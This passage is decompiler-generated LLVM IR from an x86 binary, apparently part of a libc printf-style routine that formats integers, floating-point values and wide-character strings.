  store i32 %v1_805bde2, i32* %v3_805bde7, align 4
  %v1_805bde8 = add i32 %v0_805bdd0.lcssa, 344
  %v2_805bde8 = inttoptr i32 %v1_805bde8 to i32*
  %v3_805bde8 = load i32, i32* %v2_805bde8, align 4
  store i32 %v3_805bde8, i32* %eax.global-to-local, align 4
  %v1_805bdef = inttoptr i32 %v3_805bde8 to i32*
  %v2_805bdef = load i32, i32* %v1_805bdef, align 4
  %v4_805bdef = add i32 %v0_805bdd0.lcssa, -16
  %v5_805bdef = inttoptr i32 %v4_805bdef to i32*
  store i32 %v2_805bdef, i32* %v5_805bdef, align 4
  %v0_805bdf1 = call i32 @_store_inttype()
  store i32 %v0_805bdf1, i32* %eax.global-to-local, align 4
  %v0_805bdf6 = load i32, i32* @esp, align 4
  %v1_805bdf6 = add i32 %v0_805bdf6, 16
  br label %dec_label_pc_805c230

dec_label_pc_805bdfe:                             ; preds = %dec_label_pc_805bdd0
  %tmp85 = icmp ult i32 %v3_805bdd0, 8
  br i1 %tmp85, label %dec_label_pc_805be07, label %dec_label_pc_805bf68

dec_label_pc_805be07:                             ; preds = %dec_label_pc_805bdfe
  %v1_805be07 = add i32 %v3_805bdd0, 134662948
  %v2_805be07 = inttoptr i32 %v1_805be07 to i8*
  %v3_805be07 = load i8, i8* %v2_805be07, align 1
  %v4_805be07 = sext i8 %v3_805be07 to i32
  store i32 %v4_805be07, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_805be13 = icmp eq i8 %v3_805be07, 10
  %v1_805be16 = icmp eq i1 %v9_805be13, false
  br i1 %v1_805be16, label %dec_label_pc_805be34, label %dec_label_pc_805be18

dec_label_pc_805be18:                             ; preds = %dec_label_pc_805be07
  %v1_805be18 = add i32 %v0_805bdd0.lcssa, 32
  %v2_805be18 = inttoptr i32 %v1_805be18 to i32*
  %v3_805be18 = load i32, i32* %v2_805be18, align 4
  %v1_805be1e = and i32 %v3_805be18, 32
  store i32 %v1_805be1e, i32* %eax.global-to-local, align 4
  %tmp68 = udiv i32 %v1_805be1e, 32
  %tmp69 = sub nsw i32 45, %tmp68
  store i32 %tmp69, i32* @ebx, align 4
  %v1_805be2c = trunc i32 %v3_805be18 to i8
  %v2_805be2c = and i8 %v1_805be2c, 64
  %v3_805be2c = icmp eq i8 %v2_805be2c, 0
  %v5_805be2c = zext i8 %v2_805be2c to i32
  %v7_805be2c = and i32 %v3_805be18, -256
  %v8_805be2c = or i32 %v5_805be2c, %v7_805be2c
  store i32 %v8_805be2c, i32* %edx.global-to-local, align 4
  br i1 %v3_805be2c, label %dec_label_pc_805be34, label %dec_label_pc_805be31

dec_label_pc_805be31:                             ; preds = %dec_label_pc_805be18
  %v2_805be31 = or i32 %tmp69, 128
  store i32 %v2_805be31, i32* @ebx, align 4
  br label %dec_label_pc_805be34

dec_label_pc_805be34:                             ; preds = %dec_label_pc_805be18, %dec_label_pc_805be07, %dec_label_pc_805be31
  %tmp86 = icmp ult i32 %v3_805bdd0, 6
  br i1 %tmp86, label %dec_label_pc_805be39, label %dec_label_pc_805be51

dec_label_pc_805be39:                             ; preds = %dec_label_pc_805be34
  %v9_805be39 = icmp eq i32 %v3_805bdd0, 3
  %v1_805be3c = icmp eq i1 %v9_805be39, false
  br i1 %v1_805be3c, label %dec_label_pc_805be45, label %dec_label_pc_805be3e

dec_label_pc_805be3e:                             ; preds = %dec_label_pc_805be39
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_805be53

dec_label_pc_805be45:                             ; preds = %dec_label_pc_805be39
  %v9_805be4a = icmp eq i32 %v3_805bdd0, 1
  br i1 %v9_805be4a, label %dec_label_pc_805be58, label %dec_label_pc_805be53

dec_label_pc_805be51:                             ; preds = %dec_label_pc_805be34
  %v1_805be51 = sub nsw i32 0, %v4_805be07
  store i32 %v1_805be51, i32* @esi, align 4
  br label %dec_label_pc_805be53

dec_label_pc_805be53:                             ; preds = %dec_label_pc_805be45, %dec_label_pc_805be3e, %dec_label_pc_805be51
  br label %dec_label_pc_805be58

dec_label_pc_805be58:                             ; preds = %dec_label_pc_805be45, %dec_label_pc_805be53
  %storemerge96 = phi i32 [ 11, %dec_label_pc_805be53 ], [ 6, %dec_label_pc_805be45 ]
  store i32 %storemerge96, i32* @ebp, align 4
  %v1_805be58 = add i32 %v0_805bdd0.lcssa, 7
  %v2_805be58 = inttoptr i32 %v1_805be58 to i8*
  store i8 32, i8* %v2_805be58, align 1
  %v0_805be5d = load i32, i32* @esp, align 4
  %v1_805be5d = add i32 %v0_805be5d, 20
  %v2_805be5d = inttoptr i32 %v1_805be5d to i32*
  %v3_805be5d = load i32, i32* %v2_805be5d, align 4
  %v5_805be5d = icmp slt i32 %v3_805be5d, 0
  %v1_805be62 = icmp eq i1 %v5_805be5d, false
  br i1 %v1_805be62, label %dec_label_pc_805be6c, label %dec_label_pc_805be64

dec_label_pc_805be64:                             ; preds = %dec_label_pc_805be58
  %v1_805be64 = add i32 %v0_805be5d, 36
  %v2_805be64 = inttoptr i32 %v1_805be64 to i8*
  %v3_805be64 = load i8, i8* %v2_805be64, align 1
  %v4_805be64 = zext i8 %v3_805be64 to i32
  %v5_805be64 = load i32, i32* %edx.global-to-local, align 4
  %v6_805be64 = and i32 %v5_805be64, -256
  %v7_805be64 = or i32 %v6_805be64, %v4_805be64
  store i32 %v7_805be64, i32* %edx.global-to-local, align 4
  %v3_805be68 = add i32 %v0_805be5d, 7
  %v4_805be68 = inttoptr i32 %v3_805be68 to i8*
  store i8 %v3_805be64, i8* %v4_805be68, align 1
  %v0_805be6c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805be6c

dec_label_pc_805be6c:                             ; preds = %dec_label_pc_805be58, %dec_label_pc_805be64
  %v1_805be85 = phi i32 [ %v0_805be5d, %dec_label_pc_805be58 ], [ %v0_805be6c.pre, %dec_label_pc_805be64 ]
  %v1_805be6c = add i32 %v1_805be85, 344
  %v2_805be6c = inttoptr i32 %v1_805be6c to i32*
  %v3_805be6c = load i32, i32* %v2_805be6c, align 4
  store i32 %v3_805be6c, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_805be78 = add i32 %v3_805bdd0, -1
  %v8_805be78 = icmp eq i32 %v1_805be78, 0
  store i32 %v1_805be78, i32* %ecx.global-to-local, align 4
  %v0_805be85.pre = load i32, i32* @edi, align 4
  br i1 %v8_805be78, label %dec_label_pc_805be85, label %dec_label_pc_805be7b

dec_label_pc_805be7b:                             ; preds = %dec_label_pc_805be6c
  %v2_805be7b = mul i32 %v0_805be85.pre, 4
  %v3_805be7b = add i32 %v1_805be85, 52
  %v4_805be7b = add i32 %v3_805be7b, %v2_805be7b
  %v5_805be7b = inttoptr i32 %v4_805be7b to i32*
  %v6_805be7b = load i32, i32* %v5_805be7b, align 4
  %v1_805be7f = and i32 %v6_805be7b, 3840
  store i32 %v1_805be7f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805be85

dec_label_pc_805be85:                             ; preds = %dec_label_pc_805be6c, %dec_label_pc_805be7b
  %v2_805be85 = add i32 %v1_805be85, -4
  %v3_805be85 = inttoptr i32 %v2_805be85 to i32*
  store i32 %v0_805be85.pre, i32* %v3_805be85, align 4
  %v0_805be86 = load i32, i32* @esi, align 4
  %v2_805be86 = add i32 %v1_805be85, -8
  %v3_805be86 = inttoptr i32 %v2_805be86 to i32*
  store i32 %v0_805be86, i32* %v3_805be86, align 4
  %v0_805be87 = load i32, i32* %eax.global-to-local, align 4
  %v2_805be87 = add i32 %v1_805be85, -12
  %v3_805be87 = inttoptr i32 %v2_805be87 to i32*
  store i32 %v0_805be87, i32* %v3_805be87, align 4
  %v0_805be88 = load i32, i32* %edx.global-to-local, align 4
  %v2_805be88 = add i32 %v1_805be85, -16
  %v3_805be88 = inttoptr i32 %v2_805be88 to i32*
  store i32 %v0_805be88, i32* %v3_805be88, align 4
  %v0_805be89 = call i32 @_load_inttype()
  %v0_805be8e = load i32, i32* @ebx, align 4
  %v1_805be8e = load i32, i32* @esp, align 4
  %v2_805be8e = inttoptr i32 %v1_805be8e to i32*
  store i32 %v0_805be8e, i32* %v2_805be8e, align 4
  %v0_805be91 = load i32, i32* @esi, align 4
  %v1_805be91 = load i32, i32* @esp, align 4
  %v2_805be91 = add i32 %v1_805be91, -4
  %v3_805be91 = inttoptr i32 %v2_805be91 to i32*
  store i32 %v0_805be91, i32* %v3_805be91, align 4
  %v0_805be92 = load i32, i32* @edx, align 4
  %v2_805be92 = add i32 %v1_805be91, -8
  %v3_805be92 = inttoptr i32 %v2_805be92 to i32*
  store i32 %v0_805be92, i32* %v3_805be92, align 4
  %v2_805be93 = add i32 %v1_805be91, -12
  %v3_805be93 = inttoptr i32 %v2_805be93 to i32*
  store i32 %v0_805be89, i32* %v3_805be93, align 4
  %v1_805be94 = add i32 %v1_805be91, 347
  store i32 %v1_805be94, i32* %eax.global-to-local, align 4
  %v2_805be9b = add i32 %v1_805be91, -16
  %v3_805be9b = inttoptr i32 %v2_805be9b to i32*
  store i32 %v1_805be94, i32* %v3_805be9b, align 4
  %v0_805be9c = load i32, i32* %stack_var_-364, align 4
  %v5_805be9c = inttoptr i32 %v0_805be9c to i8*
  %v6_805be9c = call i32 @_uintmaxtostr(i8* %v5_805be9c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805be9c, i32* %eax.global-to-local, align 4
  %v0_805bea1 = load i32, i32* @esp, align 4
  %v1_805bea1 = add i32 %v0_805bea1, 32
  store i32 %v6_805be9c, i32* @edi, align 4
  %v1_805bea6 = add i32 %v0_805bea1, 80
  %v2_805bea6 = inttoptr i32 %v1_805bea6 to i32*
  %v3_805bea6 = load i32, i32* %v2_805bea6, align 4
  %tmp87 = icmp ult i32 %v3_805bea6, 6
  br i1 %tmp87, label %dec_label_pc_805bed4, label %dec_label_pc_805bead

dec_label_pc_805bead:                             ; preds = %dec_label_pc_805be85
  %v1_805bead = inttoptr i32 %v6_805be9c to i8*
  %v2_805bead = load i8, i8* %v1_805bead, align 1
  %v11_805bead = icmp eq i8 %v2_805bead, 45
  %v1_805beb0 = icmp eq i1 %v11_805bead, false
  %v1_805bebf = add i32 %v0_805bea1, 64
  %v2_805bebf = inttoptr i32 %v1_805bebf to i32*
  %v3_805bebf = load i32, i32* %v2_805bebf, align 4
  br i1 %v1_805beb0, label %dec_label_pc_805bebf, label %dec_label_pc_805beb2

dec_label_pc_805beb2:                             ; preds = %dec_label_pc_805bead
  %v4_805beb2 = or i32 %v3_805bebf, 2
  store i32 %v4_805beb2, i32* %v2_805bebf, align 4
  %v0_805beb7 = load i32, i32* @edi, align 4
  %v1_805beb7 = add i32 %v0_805beb7, 1
  store i32 %v1_805beb7, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_805bed4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805bed4

dec_label_pc_805bebf:                             ; preds = %dec_label_pc_805bead
  store i32 %v3_805bebf, i32* %eax.global-to-local, align 4
  %v2_805bec3 = and i32 %v3_805bebf, 2
  %v3_805bec3 = icmp eq i32 %v2_805bec3, 0
  br i1 %v3_805bec3, label %dec_label_pc_805becb, label %dec_label_pc_805bec7

dec_label_pc_805bec7:                             ; preds = %dec_label_pc_805bebf
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805bed4

dec_label_pc_805becb:                             ; preds = %dec_label_pc_805bebf
  %v2_805becb = urem i32 %v3_805bebf, 2
  %v3_805becb = icmp eq i32 %v2_805becb, 0
  br i1 %v3_805becb, label %dec_label_pc_805bed4, label %dec_label_pc_805becf

dec_label_pc_805becf:                             ; preds = %dec_label_pc_805becb
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_805bed4

dec_label_pc_805bed4:                             ; preds = %dec_label_pc_805becb, %dec_label_pc_805be85, %dec_label_pc_805bec7, %dec_label_pc_805beb2, %dec_label_pc_805becf
  %v0_805bf27 = phi i32 [ %v6_805be9c, %dec_label_pc_805becb ], [ %v6_805be9c, %dec_label_pc_805be85 ], [ %v6_805be9c, %dec_label_pc_805bec7 ], [ %v1_805beb7, %dec_label_pc_805beb2 ], [ %v6_805be9c, %dec_label_pc_805becf ]
  %v0_805bf36 = phi i32 [ %v1_805bea1, %dec_label_pc_805becb ], [ %v1_805bea1, %dec_label_pc_805be85 ], [ %v1_805bea1, %dec_label_pc_805bec7 ], [ %v0_805bed4.pre, %dec_label_pc_805beb2 ], [ %v1_805bea1, %dec_label_pc_805becf ]
  %v1_805bed4 = add i32 %v0_805bf36, 204
  store i32 %v1_805bed4, i32* %ecx.global-to-local, align 4
  %v1_805bedb = add i32 %v0_805bf36, 20
  %v2_805bedb = inttoptr i32 %v1_805bedb to i32*
  %v3_805bedb = load i32, i32* %v2_805bedb, align 4
  store i32 %v3_805bedb, i32* %edx.global-to-local, align 4
  %v2_805bedf = sub i32 %v1_805bed4, %v0_805bf27
  store i32 %v2_805bedf, i32* %ecx.global-to-local, align 4
  %v2_805bee1 = icmp slt i32 %v3_805bedb, 0
  %v1_805bee3 = add i32 %v2_805bedf, 127
  store i32 %v1_805bee3, i32* @esi, align 4
  %v1_805bee6 = icmp eq i1 %v2_805bee1, false
  br i1 %v1_805bee6, label %dec_label_pc_805beed, label %dec_label_pc_805bee8

dec_label_pc_805bee8:                             ; preds = %dec_label_pc_805bed4
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805beed

dec_label_pc_805beed:                             ; preds = %dec_label_pc_805bed4, %dec_label_pc_805bee8
  %v0_805bf13 = phi i32 [ %v3_805bedb, %dec_label_pc_805bed4 ], [ 1, %dec_label_pc_805bee8 ]
  %v1_805beed = add i32 %v0_805bf36, 32
  %v2_805beed = inttoptr i32 %v1_805beed to i8*
  %v3_805beed = load i8, i8* %v2_805beed, align 1
  %v4_805beed = and i8 %v3_805beed, 16
  %v5_805beed = icmp eq i8 %v4_805beed, 0
  br i1 %v5_805beed, label %dec_label_pc_805bf27, label %dec_label_pc_805bef4

dec_label_pc_805bef4:                             ; preds = %dec_label_pc_805beed
  %v1_805bef4 = add i32 %v0_805bf36, 48
  %v2_805bef4 = inttoptr i32 %v1_805bef4 to i32*
  %v3_805bef4 = load i32, i32* %v2_805bef4, align 4
  store i32 %v3_805bef4, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_805bef4, 3
  br i1 %tmp88, label %dec_label_pc_805befd, label %dec_label_pc_805bf02

dec_label_pc_805befd:                             ; preds = %dec_label_pc_805bef4
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_805bf02

dec_label_pc_805bf02:                             ; preds = %dec_label_pc_805bef4, %dec_label_pc_805befd
  %v9_805bf02 = icmp eq i32 %v3_805bef4, 3
  %v1_805bf05 = icmp eq i1 %v9_805bf02, false
  br i1 %v1_805bf05, label %dec_label_pc_805bf0e, label %dec_label_pc_805bf07

dec_label_pc_805bf07:                             ; preds = %dec_label_pc_805bf02
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_805bf27

dec_label_pc_805bf0e:                             ; preds = %dec_label_pc_805bf02
  %v9_805bf0e = icmp eq i32 %v3_805bef4, 4
  %v1_805bf11 = icmp eq i1 %v9_805bf0e, false
  br i1 %v1_805bf11, label %dec_label_pc_805bf27, label %dec_label_pc_805bf13

dec_label_pc_805bf13:                             ; preds = %dec_label_pc_805bf0e
  %tmp = icmp ugt i32 %v0_805bf13, %v1_805bee3
  br i1 %tmp, label %dec_label_pc_805bf27, label %dec_label_pc_805bf17

dec_label_pc_805bf17:                             ; preds = %dec_label_pc_805bf13
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805bf1c = inttoptr i32 %v0_805bf27 to i8*
  %v2_805bf1c = load i8, i8* %v1_805bf1c, align 1
  %v8_805bf1c = icmp eq i8 %v2_805bf1c, 48
  br i1 %v8_805bf1c, label %dec_label_pc_805bf27, label %dec_label_pc_805bf21

dec_label_pc_805bf21:                             ; preds = %dec_label_pc_805bf17
  %v1_805bf21 = add i32 %v2_805bedf, 128
  store i32 %v1_805bf21, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805bf27

dec_label_pc_805bf27:                             ; preds = %dec_label_pc_805bf13, %dec_label_pc_805bf17, %dec_label_pc_805bf0e, %dec_label_pc_805beed, %dec_label_pc_805bf07, %dec_label_pc_805bf21
  %v0_805bf5f = phi i32 [ %v0_805bf13, %dec_label_pc_805bf13 ], [ 1, %dec_label_pc_805bf17 ], [ %v0_805bf13, %dec_label_pc_805bf0e ], [ %v0_805bf13, %dec_label_pc_805beed ], [ %v0_805bf13, %dec_label_pc_805bf07 ], [ %v1_805bf21, %dec_label_pc_805bf21 ]
  %v1_805bf27 = inttoptr i32 %v0_805bf27 to i8*
  %v2_805bf27 = load i8, i8* %v1_805bf27, align 1
  %v8_805bf27 = icmp eq i8 %v2_805bf27, 48
  %v1_805bf2a = icmp eq i1 %v8_805bf27, false
  br i1 %v1_805bf2a, label %dec_label_pc_805bf57, label %dec_label_pc_805bf2c

dec_label_pc_805bf2c:                             ; preds = %dec_label_pc_805bf27
  %v0_805bf2c = load i32, i32* @ebp, align 4
  %v7_805bf2f = icmp sgt i32 %v0_805bf2c, 5
  br i1 %v7_805bf2f, label %dec_label_pc_805bf31, label %dec_label_pc_805bf36

dec_label_pc_805bf31:                             ; preds = %dec_label_pc_805bf2c
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_805bf36

dec_label_pc_805bf36:                             ; preds = %dec_label_pc_805bf2c, %dec_label_pc_805bf31
  %v1_805bf36 = add i32 %v0_805bf36, 48
  %v2_805bf36 = inttoptr i32 %v1_805bf36 to i32*
  %v3_805bf36 = load i32, i32* %v2_805bf36, align 4
  %v12_805bf36 = icmp eq i32 %v3_805bf36, 1
  %v1_805bf3b = icmp eq i1 %v12_805bf36, false
  br i1 %v1_805bf3b, label %dec_label_pc_805bf4c, label %dec_label_pc_805bf3d

dec_label_pc_805bf3d:                             ; preds = %dec_label_pc_805bf36
  store i32 ptrtoint ([6 x i8]* @global_var_806cb0c.699 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_805c0c8

dec_label_pc_805bf4c:                             ; preds = %dec_label_pc_805bf36
  %v1_805bf4c = icmp eq i32 %v0_805bf5f, 0
  %v1_805bf4e = icmp eq i1 %v1_805bf4c, false
  br i1 %v1_805bf4e, label %dec_label_pc_805bf57, label %dec_label_pc_805bf50

dec_label_pc_805bf50:                             ; preds = %dec_label_pc_805bf4c
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805c0c8

dec_label_pc_805bf57:                             ; preds = %dec_label_pc_805bf4c, %dec_label_pc_805bf27
  %v2_805bf57 = sub i32 %v0_805bf5f, %v1_805bee3
  %v7_805bf57 = icmp ult i32 %v0_805bf5f, %v1_805bee3
  %v12_805bf57 = icmp eq i32 %v2_805bf57, 0
  %v2_805bf59 = or i1 %v7_805bf57, %v12_805bf57
  br i1 %v2_805bf59, label %dec_label_pc_805c0c8, label %dec_label_pc_805bf5f

dec_label_pc_805bf5f:                             ; preds = %dec_label_pc_805bf57
  store i32 %v2_805bf57, i32* @ebx, align 4
  br label %dec_label_pc_805c0e2

dec_label_pc_805bf68:                             ; preds = %dec_label_pc_805bdfe
  %tmp89 = icmp ult i32 %v3_805bdd0, 16
  br i1 %tmp89, label %dec_label_pc_805bf6d, label %dec_label_pc_805bfb2

dec_label_pc_805bf6d:                             ; preds = %dec_label_pc_805bf68
  %v1_805bf6d = add i32 %v0_805bdd0.lcssa, 33
  %v2_805bf6d = inttoptr i32 %v1_805bf6d to i8*
  %v3_805bf6d = load i8, i8* %v2_805bf6d, align 1
  %v4_805bf6d = and i8 %v3_805bf6d, 8
  %v5_805bf6d = icmp eq i8 %v4_805bf6d, 0
  %v1_805bf72 = add i32 %v0_805bdd0.lcssa, 344
  %v2_805bf72 = inttoptr i32 %v1_805bf72 to i32*
  %v3_805bf72 = load i32, i32* %v2_805bf72, align 4
  store i32 %v3_805bf72, i32* %edx.global-to-local, align 4
  br i1 %v5_805bf6d, label %dec_label_pc_805bf7f, label %dec_label_pc_805bf7b

dec_label_pc_805bf7b:                             ; preds = %dec_label_pc_805bf6d
  %v1_805bf7b = inttoptr i32 %v3_805bf72 to x86_fp80*
  %v2_805bf7b = load x86_fp80, x86_fp80* %v1_805bf7b, align 4
  br label %dec_label_pc_805bf81

dec_label_pc_805bf7f:                             ; preds = %dec_label_pc_805bf6d
  %v1_805bf7f = inttoptr i32 %v3_805bf72 to double*
  %v2_805bf7f = load double, double* %v1_805bf7f, align 4
  %v3_805bf7f = fpext double %v2_805bf7f to x86_fp80
  br label %dec_label_pc_805bf81

dec_label_pc_805bf81:                             ; preds = %dec_label_pc_805bf7b, %dec_label_pc_805bf7f
  %storemerge4 = phi x86_fp80 [ %v2_805bf7b, %dec_label_pc_805bf7b ], [ %v3_805bf7f, %dec_label_pc_805bf7f ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_805bf81 = load i32, i32* @esi, align 4
  %v2_805bf81 = add i32 %v0_805bdd0.lcssa, -4
  %v3_805bf81 = inttoptr i32 %v2_805bf81 to i32*
  store i32 %v0_805bf81, i32* %v3_805bf81, align 4
  %v0_805bf82 = load i32, i32* @esi, align 4
  %v2_805bf82 = add i32 %v0_805bdd0.lcssa, -8
  %v3_805bf82 = inttoptr i32 %v2_805bf82 to i32*
  store i32 %v0_805bf82, i32* %v3_805bf82, align 4
  %v1_805bf83 = add i32 %v0_805bdd0.lcssa, -12
  %v2_805bf83 = inttoptr i32 %v1_805bf83 to i32*
  store i32 134593606, i32* %v2_805bf83, align 4
  %v1_805bf88 = add i32 %v0_805bdd0.lcssa, 20
  store i32 %v1_805bf88, i32* %eax.global-to-local, align 4
  %v2_805bf8c = add i32 %v0_805bdd0.lcssa, -16
  %v3_805bf8c = inttoptr i32 %v2_805bf8c to i32*
  store i32 %v1_805bf88, i32* %v3_805bf8c, align 4
  %v1_805bf8d = add i32 %v0_805bdd0.lcssa, -28
  %v1_805bf90 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_805bf90 = inttoptr i32 %v1_805bf8d to x86_fp80*
  store x86_fp80 %v1_805bf90, x86_fp80* %v3_805bf90, align 4
  %v1_805bf93 = add i32 %v0_805bdd0.lcssa, 368
  %v2_805bf93 = inttoptr i32 %v1_805bf93 to i32*
  %v3_805bf93 = load i32, i32* %v2_805bf93, align 4
  %v5_805bf93 = add i32 %v0_805bdd0.lcssa, -32
  %v6_805bf93 = inttoptr i32 %v5_805bf93 to i32*
  store i32 %v3_805bf93, i32* %v6_805bf93, align 4
  %v0_805bf9a = call i32 @_fpmaxtostr()
  store i32 %v0_805bf9a, i32* %eax.global-to-local, align 4
  %v0_805bf9f = load i32, i32* @esp, align 4
  %v1_805bf9f = add i32 %v0_805bf9f, 32
  %v2_805bfa2 = icmp slt i32 %v0_805bf9a, 0
  br i1 %v2_805bfa2, label %dec_label_pc_805c243, label %dec_label_pc_805bfaa

dec_label_pc_805bfaa:                             ; preds = %dec_label_pc_805bf81
  %v1_805bfaa = inttoptr i32 %v1_805bf9f to i32*
  %v2_805bfaa = load i32, i32* %v1_805bfaa, align 4
  %v4_805bfaa = add i32 %v2_805bfaa, %v0_805bf9a
  store i32 %v4_805bfaa, i32* %v1_805bfaa, align 4
  %v0_805c230.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c230

dec_label_pc_805bfb2:                             ; preds = %dec_label_pc_805bf68
  %tmp90 = or i32 %v3_805bdd0, 1
  %tmp91 = icmp eq i32 %tmp90, 17
  br i1 %tmp91, label %dec_label_pc_805bfbb, label %dec_label_pc_805c04e

dec_label_pc_805bfbb:                             ; preds = %dec_label_pc_805bfb2
  %v9_805bfb2 = icmp eq i32 %v3_805bdd0, 17
  %v1_805bfbb = add i32 %v0_805bdd0.lcssa, 332
  %v2_805bfbb = inttoptr i32 %v1_805bfbb to i32*
  store i32 0, i32* %v2_805bfbb, align 4
  %v0_805bfc6 = load i32, i32* @esp, align 4
  %v1_805bfc6 = add i32 %v0_805bfc6, 344
  %v2_805bfc6 = inttoptr i32 %v1_805bfc6 to i32*
  %v3_805bfc6 = load i32, i32* %v2_805bfc6, align 4
  store i32 %v3_805bfc6, i32* %edx.global-to-local, align 4
  %v1_805bfcd = icmp eq i1 %v9_805bfb2, false
  br i1 %v1_805bfcd, label %dec_label_pc_805c019, label %dec_label_pc_805bfcf

dec_label_pc_805bfcf:                             ; preds = %dec_label_pc_805bfbb
  %v1_805bfcf = inttoptr i32 %v3_805bfc6 to i32*
  %v2_805bfcf = load i32, i32* %v1_805bfcf, align 4
  store i32 %v2_805bfcf, i32* %eax.global-to-local, align 4
  %v2_805bfd1 = add i32 %v0_805bfc6, 340
  %v3_805bfd1 = inttoptr i32 %v2_805bfd1 to i32*
  store i32 %v2_805bfcf, i32* %v3_805bfd1, align 4
  %v0_805bfd8 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bfd8 = icmp eq i32 %v0_805bfd8, 0
  br i1 %v1_805bfd8, label %dec_label_pc_805c0cc, label %dec_label_pc_805bfe0

dec_label_pc_805bfe0:                             ; preds = %dec_label_pc_805bfcf
  %v0_805bfe0 = load i32, i32* @esp, align 4
  %v1_805bfe0 = add i32 %v0_805bfe0, 20
  %v2_805bfe0 = inttoptr i32 %v1_805bfe0 to i32*
  %v3_805bfe0 = load i32, i32* %v2_805bfe0, align 4
  store i32 %v3_805bfe0, i32* %eax.global-to-local, align 4
  %v2_805bfe7 = icmp slt i32 %v3_805bfe0, 0
  br i1 %v2_805bfe7, label %dec_label_pc_805bfed, label %dec_label_pc_805bfeb

dec_label_pc_805bfeb:                             ; preds = %dec_label_pc_805bfe0
  br label %dec_label_pc_805bfed

dec_label_pc_805bfed:                             ; preds = %dec_label_pc_805bfe0, %dec_label_pc_805bfeb
  %storemerge95 = phi i32 [ %v3_805bfe0, %dec_label_pc_805bfeb ], [ -1, %dec_label_pc_805bfe0 ]
  store i32 %storemerge95, i32* %ecx.global-to-local, align 4
  %v1_805bfed = add i32 %v0_805bfe0, 340
  store i32 %v1_805bfed, i32* %edx.global-to-local, align 4
  %v1_805bff4 = add i32 %v0_805bfe0, 332
  store i32 %v1_805bff4, i32* %eax.global-to-local, align 4
  %v2_805bffb = add i32 %v0_805bfe0, -4
  %v3_805bffb = inttoptr i32 %v2_805bffb to i32*
  store i32 %v1_805bff4, i32* %v3_805bffb, align 4
  %v0_805bffc = load i32, i32* %ecx.global-to-local, align 4
  %v2_805bffc = add i32 %v0_805bfe0, -8
  %v3_805bffc = inttoptr i32 %v2_805bffc to i32*
  store i32 %v0_805bffc, i32* %v3_805bffc, align 4
  %v0_805bffd = load i32, i32* %edx.global-to-local, align 4
  %v2_805bffd = add i32 %v0_805bfe0, -12
  %v3_805bffd = inttoptr i32 %v2_805bffd to i32*
  store i32 %v0_805bffd, i32* %v3_805bffd, align 4
  %v0_805bffe = load i32, i32* %edx.global-to-local, align 4
  %v2_805bffe = add i32 %v0_805bfe0, -16
  %v3_805bffe = inttoptr i32 %v2_805bffe to i32*
  store i32 %v0_805bffe, i32* %v3_805bffe, align 4
  %v0_805bfff = call i32 @__GI_wcsrtombs()
  store i32 %v0_805bfff, i32* %eax.global-to-local, align 4
  %v0_805c004 = load i32, i32* @esp, align 4
  %v1_805c004 = add i32 %v0_805c004, 16
  store i32 %v0_805bfff, i32* @esi, align 4
  %v10_805c009 = icmp eq i32 %v0_805bfff, -1
  br i1 %v10_805c009, label %dec_label_pc_805c243, label %dec_label_pc_805c012

dec_label_pc_805c012:                             ; preds = %dec_label_pc_805bfed
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805c0d6

dec_label_pc_805c019:                             ; preds = %dec_label_pc_805bfbb
  %v0_805c019 = load i32, i32* @ebx, align 4
  %v2_805c019 = add i32 %v0_805bfc6, -4
  %v3_805c019 = inttoptr i32 %v2_805c019 to i32*
  store i32 %v0_805c019, i32* %v3_805c019, align 4
  %v1_805c01a = add i32 %v0_805bfc6, 332
  store i32 %v1_805c01a, i32* %eax.global-to-local, align 4
  %v2_805c021 = add i32 %v0_805bfc6, -8
  %v3_805c021 = inttoptr i32 %v2_805c021 to i32*
  store i32 %v1_805c01a, i32* %v3_805c021, align 4
  %v0_805c022 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c022 = inttoptr i32 %v0_805c022 to i32*
  %v2_805c022 = load i32, i32* %v1_805c022, align 4
  %v4_805c022 = add i32 %v0_805bfc6, -12
  %v5_805c022 = inttoptr i32 %v4_805c022 to i32*
  store i32 %v2_805c022, i32* %v5_805c022, align 4
  %v1_805c024 = add i32 %v0_805bfc6, 204
  store i32 %v1_805c024, i32* @ebx, align 4
  %v2_805c02b = add i32 %v0_805bfc6, -16
  %v3_805c02b = inttoptr i32 %v2_805c02b to i32*
  store i32 %v1_805c024, i32* %v3_805c02b, align 4
  %v0_805c02c = call i32 @__GI_wcrtomb()
  store i32 %v0_805c02c, i32* %eax.global-to-local, align 4
  %v0_805c031 = load i32, i32* @esp, align 4
  %v1_805c031 = add i32 %v0_805c031, 16
  store i32 %v0_805c02c, i32* @esi, align 4
  %v10_805c036 = icmp eq i32 %v0_805c02c, -1
  br i1 %v10_805c036, label %dec_label_pc_805c243, label %dec_label_pc_805c03f

dec_label_pc_805c03f:                             ; preds = %dec_label_pc_805c019
  %v0_805c03f = load i32, i32* @ebx, align 4
  store i32 %v0_805c03f, i32* @edi, align 4
  %v2_805c041 = add i32 %v0_805c02c, 220
